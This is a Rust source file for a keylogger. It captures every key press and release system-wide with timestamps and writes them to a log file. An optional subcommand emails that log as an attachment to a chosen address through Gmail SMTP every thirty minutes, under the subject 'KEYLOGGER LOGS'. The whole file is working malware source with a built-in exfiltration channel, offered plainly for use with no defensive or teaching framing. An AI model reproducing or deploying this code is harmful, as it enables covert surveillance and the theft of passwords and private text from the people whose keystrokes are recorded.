use chrono::prelude::*;
use lettre::smtp::authentication::Credentials;
use lettre::{SmtpClient, SmtpTransport, Transport};
use lettre_email::mime::TEXT_PLAIN;
use lettre_email::EmailBuilder;
use rdev::{listen, Event, EventType};
use std::fs::{File, OpenOptions};
use std::io::Write;
use std::path::Path;
use std::cell::RefCell;
use std::time::Duration;
use clap::{Parser, Subcommand};

#[derive(Parser)]
#[clap(author, version, about, long_about = None)]
#[clap(propagate_version = true)]
struct Cli {
    #[clap(subcommand)]
    command: Option<Commands>,

    ///the file to log things
    #[clap(short, long)]
    logfile: Option<String>,
}

#[derive(Subcommand)]
enum Commands {
    Email {
        ///whom the email shall be sent to
        #[clap(short, long)]
        receiver: String,
        ///by whom the email shall be sent
        #[clap(short, long)]
        sender: String,
        ///the sender's password
        #[clap(short, long)]
        password: String,
    },
}

struct ContentWrapper {
    file: RefCell<File>,
}

impl ContentWrapper {
    pub fn new(name: String) -> Self {
        Self {
            file: RefCell::new(
                OpenOptions::new()
                    .create(true)
                    .append(true)
                    .write(true)
                    .open(name)
                    .unwrap(),
            ),
        }
    }
    pub fn write_event(&self, event: Event) {
        let ev_type = match event.event_type {
            EventType::KeyPress(key) => {
                format!("KEYPRESS: {:?}", key)
            }
            EventType::KeyRelease(key) =>{
                format!("KEYRELEASE: {:?}", key)
            }
            _ => {
                return;
            }
        };
        let text = format!("[{}] {}\n", Utc::now(), ev_type);
        if let Err(e) = self.file.borrow_mut().write(text.as_bytes()) {
            println!("ERROR: {:?}", e);
        }
    }
}

struct Mail {
    smpt_server: String,
}

impl Mail {
    pub fn new() -> Self {
        // GMAIL
        Mail {
            smpt_server: String::from("smtp.googlemail.com"),
        }
    }
    ///FROM: (username, password)
    ///You might need to enable https://www.google.com/settings/security/lesssecureapps
    ///REFERENCE: https://gist.github.com/gyng/5d60225d55928ab4cf55309c88b25ecf
    pub fn send_email(&self, from: (String, String), to: String, logs: &String) {
        let mime = TEXT_PLAIN;
        let path = format!("./{}", logs);
        let path = Path::new(&path);
        let email = EmailBuilder::new()
            .to(to)
            .from(from.0.clone())
            .subject("KEYLOGGER LOGS")
            .body("KEYLOGGER LOGS")
            .text("here are the logs:")
            .attachment_from_file(path, Some(logs.as_str()), &mime)
            .unwrap()
            .build()
            .unwrap();
        let mut mailer = SmtpTransport::new(
            SmtpClient::new_simple(self.smpt_server.as_str())
                .unwrap()
                .credentials(Credentials::new(from.0, from.1)),
        );
        mailer.send(email.clone().into()).unwrap();
        println!("EMAIL SENT");
    }
}



fn main() {



    let args = Cli::parse();
    let log_file = args.logfile.unwrap_or(String::from("keys.txt"));


    if let Some(email) = args.command {
        let log_file = log_file.clone();
        let Commands::Email { sender, receiver, password  } = email;
            std::thread::spawn(move || {
            let mailer = Mail::new();
            loop {
                std::thread::sleep(Duration::from_secs(60 * 30));
                mailer.send_email(
                    (
                        sender.clone(),
                        password.clone(),
                    ),
                    receiver.clone(),
                    &log_file
                );
            }
        });
    }

    let logs = ContentWrapper::new(log_file);

    if let Err(error) = listen(move |e| {
        logs.write_event(e);
    }) {
        println!("Error: {:?}", error)
    }
}
